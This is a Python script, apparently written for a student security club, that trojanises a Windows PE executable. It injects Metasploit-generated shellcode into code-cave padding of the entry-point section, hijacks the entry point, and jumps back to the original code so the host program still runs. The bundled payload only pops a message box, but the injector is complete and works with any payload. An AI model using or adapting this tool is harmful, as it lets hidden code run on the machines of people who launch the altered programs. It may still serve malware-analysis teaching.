#import pydasm
from pefile import PE
from struct import pack
from sys import exit

# note, shellcode used should clean up after itself so pusha/popa instructions can be used to
# restore register values to their original state, no stack smashing!

IMAGE_SCN_CNT_CODE    = 0x00000020 # The section contains executable code.
IMAGE_SCN_MEM_EXECUTE = 0x20000000 # The section can be executed as code.
IMAGE_SCN_MEM_READ    = 0x40000000 # The section can be read.
IMAGE_SCN_MEM_WRITE   = 0x80000000 # The section can be written to.

# msfpayload message box - 260 bytes
shellcode = """\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x61\xff\xff\xff\x68\x64\x58\x20\x20\x68\x4f\x77\x6e\x65\x31\xdb\x88\x5c\x24\x05\x89\xe3\x68\x65\x58\x20\x20\x68\x72\x61\x62\x6c\x68\x62\x6c\x65\x20\x68\x65\x20\x72\x61\x68\x52\x61\x62\x6c\x31\xc9\x88\x4c\x24\x11\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0"""

def fixShellcode(sc, jmp_distance):
	''' Add a pusha / popa instruction to the beggining and end of the shellcode, respectively. 
		Then add a jmp instruction to jump jmp_distance at the end. jmp_distance is a relative distance. '''

	# \x60 = pusha, \x61 = popa, \xe9 = 32 bit relative distance
	new_sc = '\x60%s\x61\xe9%s' % (sc, pack('I', jmp_distance & 0xffffffff))
	return new_sc


def insertShellcode(data, offset, sc):

	# convert to list, replace shellcode, convert back to string
	new_data = list(data)
	new_data[offset:offset+len(sc)] = sc
	new_data = ''.join(new_data)
	return new_data


def changeEntryPoint(pe, new_addr):
	''' change the entry point to the desired location '''
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_addr


def getSectionPermissions(section):
    r,w,x = False, False, False
    characteristics = section.Characteristics
    
    if characteristics & 0x20000000:
        x = True
    if characteristics & 0x40000000:
        r = True
    if characteristics & 0x80000000:
        w = True
    
    return {'read':r, 'write':w, 'exec':x}

def getEPDetails(pe):
	''' Return the offset of the end of the raw data on disk for the section containing the PE's entry point, the
		offset at the end of the same section with any padding up to the file alignment, length of any padding, and the permission of the section. '''
	# values we'll need
	section = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	file_alignment = pe.OPTIONAL_HEADER.SectionAlignment

	# get entry offset directly
	entry_offset = pe.get_offset_from_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)

	# how much space is left
	remaining = (section.VirtualAddress + section.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
	end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + remaining

	# must be aligned with section
	padding = file_alignment - (end_rva % file_alignment)
	end_offset = pe.get_offset_from_rva(end_rva)
	end_offset_aligned = pe.get_offset_from_rva(end_rva+padding) - 1 # if the rva is calculated from the offset later, we don't want
	# the beginning of the next section aligned address, but the end of this file aligned section... just accept it lol

	permissions = getSectionPermissions(section)
	return (end_offset, end_offset_aligned, padding, permissions)

if __name__ == '__main__':
	#pe = pefile.PE(r'C:\users\nomnom\utdcsg\reversing\crash course\a.exe')
	#executable = r'C:\windows\system32\calc.exe'
	#executable = r'C:\windows\system32\notepad.exe'
	#executable = r'C:\windows\system32\explorer.exe'
	#executable = r'C:\users\nomnom\utdcsg\reversing\crash course\a.exe'
	#executable = r'C:\Users\nomnom\utdcsg\malware\calc.exe'
	executable = r'C:\Users\nomnom\utdcsg\malware\ImmunityDebugger.exe'
	pe = PE(executable)
	original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	(end_offset, end_offset_aligned, padding, permissions) = getEPDetails(pe)

	# check permissions
	print '[*] Permissions for entry point\'s section : %s' % (','.join(permissions.keys()))
	if permissions['exec'] == False:
		print '[!] Entry point is not executable! Wtf? Exiting!'
		exit(1)

	# check for enough padding to fit the payload
	print '[*] Found %d bytes of padding' % padding
	sc_size = len(shellcode)+7 # +1 pusha, +1 popa, +5 rel32 jmp

	if padding < sc_size:
		print '[!] Not enough padding to insert shellcode :('
		exit(1)
	else:
		print '  [+] There is enough room for the shellcode!'
		print '  [+] start_va = 0x%08x, end_va = 0x%08x' % (pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(end_offset), pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(end_offset_aligned))
		print '  [+] start_offset = 0x%x, end_offset = 0x%x' % (end_offset, end_offset_aligned)

	# we will use the bytes towards the end of the last buffer to try to make 
	# sure we are using the bytes of padding and no something of importance
	sc_end_offset = end_offset_aligned
	sc_start_offset = sc_end_offset - sc_size
	print '[*] Placing the payload at :'
	print '  [+] start_va = 0x%08x, end_va = 0x%08x' % (pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(sc_start_offset), pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(sc_end_offset))
	print '  [+] start_offset = 0x%x, end_offset = 0x%x' % (sc_start_offset, sc_end_offset)

	changeEntryPoint(pe, pe.get_rva_from_offset(sc_start_offset))
	raw_data = pe.write()
	jmp_distance = original_entry_point - pe.get_rva_from_offset(sc_end_offset)
	shellcode = fixShellcode(shellcode, jmp_distance)
	raw_data = insertShellcode(raw_data, sc_start_offset, shellcode)
	new_file = open(r'C:\Users\nomnom\utdcsg\malware\ImmunityDebugger3.exe', 'wb')
	new_file.write(raw_data)
	new_file.close()
	print '[*] New file created :)'




#def getFirstBytes(data, min_length):
#	''' get the first x number of bytes of min_length or more. use pydasm to make sure
#		we pull the bytes out at a valid instruction offset, and not in the middle of an instruction '''
#	
#	offset = 0
#	while offset < len(data):
#		if offset >= min_length:
#			return (data[:offset], offset)
#		i = pydasm.get_instruction(data[offset:], pydasm.MODE_32)
#		#print pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+offset)
#		offset += i.length
		